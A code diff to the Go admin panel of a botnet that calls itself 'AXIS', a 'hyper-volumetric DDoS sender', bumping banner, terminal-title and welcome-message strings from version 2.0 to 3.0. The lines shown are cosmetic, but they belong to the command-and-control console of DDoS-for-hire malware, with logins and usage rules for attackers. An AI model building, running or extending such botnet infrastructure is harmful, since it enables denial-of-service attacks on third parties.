@@ -34,7 +34,7 @@ func (this *Admin) Handle() {
 	this.conn.Write([]byte("\x1b[1;34m   ╔═╗═╗ ╦╦╔═╗\r\n"))
 	this.conn.Write([]byte("\x1b[1;36m   ╠═╣╔╩╦╝║╚═╗\r\n"))
 	this.conn.Write([]byte("\x1b[1;94m   ╩ ╩╩ ╚═╩╚═╝\r\n"))
-	this.conn.Write([]byte("\x1b[1;34m  AXIS 2.0 DDoS from AXIS\r\n"))
+	this.conn.Write([]byte("\x1b[1;34m  AXIS 3.0 DDoS from AXIS\r\n"))
 	this.conn.Write([]byte("\x1b[1;36m  hyper-volumetric DDoS sender\r\n"))
 	this.conn.Write([]byte("\x1b[1;94mUsername\x1b[1;36m: \x1b[0m"))
 	username, err := this.ReadLine(false)
@@ -83,9 +83,9 @@ func (this *Admin) Handle() {
 	go func() {
 		for {
 			time.Sleep(time.Second)
-			title := fmt.Sprintf("\033]0; P2P Network | AXIS 2.0 | User: %s\007", username)
+			title := fmt.Sprintf("\033]0; P2P Network | AXIS 3.0 | User: %s\007", username)
 			if userInfo.admin == 1 {
-				title = fmt.Sprintf("\033]0; P2P | Admins: %d | Users: %d | AXIS 2.0 | %s\007",
+				title = fmt.Sprintf("\033]0; P2P | Admins: %d | Users: %d | AXIS 3.0 | %s\007",
 					database.totalAdmins(), database.totalUsers(), username)
 			}
 			if _, err := this.conn.Write([]byte(title)); err != nil {
@@ -213,7 +213,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mHey \033[01;36m" + username + "!\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;34m  \033[01;37mDont spam attacks! Dont share logins!\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[01;37mDont attack government targets!\r\n")))
-			this.conn.Write([]byte(fmt.Sprintf("\033[01;34m  \033[01;37mAXIS 2.0 - Merged Edition\r\n")))
+			this.conn.Write([]byte(fmt.Sprintf("\033[01;34m  \033[01;37mAXIS 3.0 - Merged Edition\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;36m  \033[01;37mVersion\033[01;34m:\033[01;37m \033[01;37mv2.0\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m\033[01;34m ══════════════┌∩┐(◣_◢)┌∩┐\033[01;36m══════════════\r\n")))
 			continue
